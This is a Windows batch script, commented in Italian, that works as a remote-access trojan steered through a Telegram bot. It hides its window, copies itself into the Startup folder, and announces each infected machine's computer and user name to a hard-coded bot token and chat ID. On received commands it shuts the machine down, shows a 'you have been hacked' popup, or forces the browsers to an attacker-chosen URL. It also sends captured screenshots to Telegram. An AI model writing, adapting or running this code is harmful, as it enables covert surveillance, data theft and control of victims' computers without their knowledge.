@echo off
if "%1" == "hidden" goto :start

:: Riavvio in modalità nascosta
powershell -window hidden -command "Start-Process cmd -ArgumentList '/c','%~nx0','hidden' -WindowStyle Hidden"
exit /b

:start
setlocal enabledelayedexpansion

:: Configurazione
set "BOT_TOKEN=7711566157:AAEs2eaKEVqE5pWYLc9L4WiDIc8vS5n83hw"
set "CHAT_ID=5709299213"
set "SCREENSHOT_PATH=%TEMP%\%RANDOM%.png"
set "LAST_COMMAND_ID=0"

:: Notifica connessione e ottieni ultimo update_id
for /f "tokens=*" %%A in ('curl -s -X GET "https://api.telegram.org/bot%BOT_TOKEN%/getUpdates" ^| powershell -command "$json=ConvertFrom-Json ($input); if($json.ok -and $json.result) { $json.result[-1].update_id } else { 0 }"') do (
    set "LAST_COMMAND_ID=%%A"
)

curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
    -d "chat_id=%CHAT_ID%" ^
    -d "text=🟢 Nuova connessione da: %COMPUTERNAME% (%USERNAME%)"

:: Aggiungi all'avvio automatico
if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\remote_controller.bat" (
    copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
)

:: Verifica/installa curl
where curl >nul 2>&1 || (
    bitsadmin /transfer "DownloadCurl" /download /priority high "https://curl.se/windows/latest.cgi?p=win64-mingw.zip" "%TEMP%\curl.zip" || (
        powershell -command "Invoke-WebRequest 'https://curl.se/windows/latest.cgi?p=win64-mingw.zip' -OutFile '%TEMP%\curl.zip'"
    )
    powershell -command "Expand-Archive '%TEMP%\curl.zip' '%TEMP%\curl' -Force"
    set "PATH=%TEMP%\curl\curl-*-win64-mingw\bin;%PATH%"
)

:: Loop principale
:command_loop
curl -s -X GET "https://api.telegram.org/bot%BOT_TOKEN%/getUpdates?offset=%LAST_COMMAND_ID%" > "%TEMP%\updates.json"

for /f "tokens=*" %%A in ('powershell -command "$json=Get-Content '%TEMP%\updates.json'|ConvertFrom-Json;if($json.ok -and $json.result){$json.result|ForEach-Object{if($_.update_id -gt %LAST_COMMAND_ID%){$LAST_COMMAND_ID=$_.update_id; if($_.message.text){Write-Output ($_.update_id.ToString()+':'+$_.message.text)}}}}"') do (
    set "update_data=%%A"
    set "LAST_COMMAND_ID=!update_data:*:=!"
    set "command=!update_data:*:=!"
    
    if /i "!command!" == "chiudi" (
        curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
            -d "chat_id=%CHAT_ID%" ^
            -d "text=🔴 Spegnimento di: %COMPUTERNAME%"
        shutdown /s /t 0
        exit
    )
    
    if /i "!command!" == "foto" (
        call :capture_screen
        curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
            -d "chat_id=%CHAT_ID%" ^
            -d "text=📸 Screenshot catturato da %COMPUTERNAME%"
    )
    
    if /i "!command!" == "pop" (
        powershell -command "[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('SEI STATO HACKERATO','ATTENZIONE',[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Warning)"
        curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
            -d "chat_id=%CHAT_ID%" ^
            -d "text=💀 Popup mostrato su %COMPUTERNAME%"
    )
    
    echo !command! | findstr /r /c:"^http://" /c:"^https://" >nul && (
        curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
            -d "chat_id=%CHAT_ID%" ^
            -d "text=🔗 Apertura URL su %COMPUTERNAME%: !command!"
        
        :: Chiudi browser esistenti
        taskkill /IM chrome.exe /IM msedge.exe /IM firefox.exe /IM iexplore.exe /F >nul 2>&1
        
        :: Apri URL in browser predefinito
        start "" "!command!"
        
        :: Attesa caricamento pagina (15 secondi)
        timeout /t 15 /nobreak >nul
        
        :: Cattura screenshot finestra attiva
        powershell -command "Add-Type -AssemblyName System.Windows.Forms; [Windows.Forms.SendKeys]::SendWait('%{PRTSC}'); Start-Sleep -Milliseconds 2000; $img=[Windows.Forms.Clipboard]::GetImage(); if($img){$img.Save('%SCREENSHOT_PATH%',[Drawing.Imaging.ImageFormat]::Png)}"
        
        if exist "%SCREENSHOT_PATH%" (
            curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendPhoto" ^
                -F chat_id=%CHAT_ID% ^
                -F photo=@"%SCREENSHOT_PATH%" ^
                -F caption="🌐 %COMPUTERNAME%: !command!"
            del "%SCREENSHOT_PATH%" >nul
        )
    )
)

timeout /t 5 /nobreak >nul
goto command_loop

:capture_screen
powershell -command "Add-Type -AssemblyName System.Windows.Forms; [Windows.Forms.SendKeys]::SendWait('{PRTSC}'); Start-Sleep -Milliseconds 1000; $img=[Windows.Forms.Clipboard]::GetImage(); if($img){$img.Save('%SCREENSHOT_PATH%',[Drawing.Imaging.ImageFormat]::Png)}"

if exist "%SCREENSHOT_PATH%" (
    curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendPhoto" ^
        -F chat_id=%CHAT_ID% ^
        -F photo=@"%SCREENSHOT_PATH%" ^
        -F caption="🖥️ %COMPUTERNAME%: Schermo intero"
    del "%SCREENSHOT_PATH%" >nul
)
exit /b
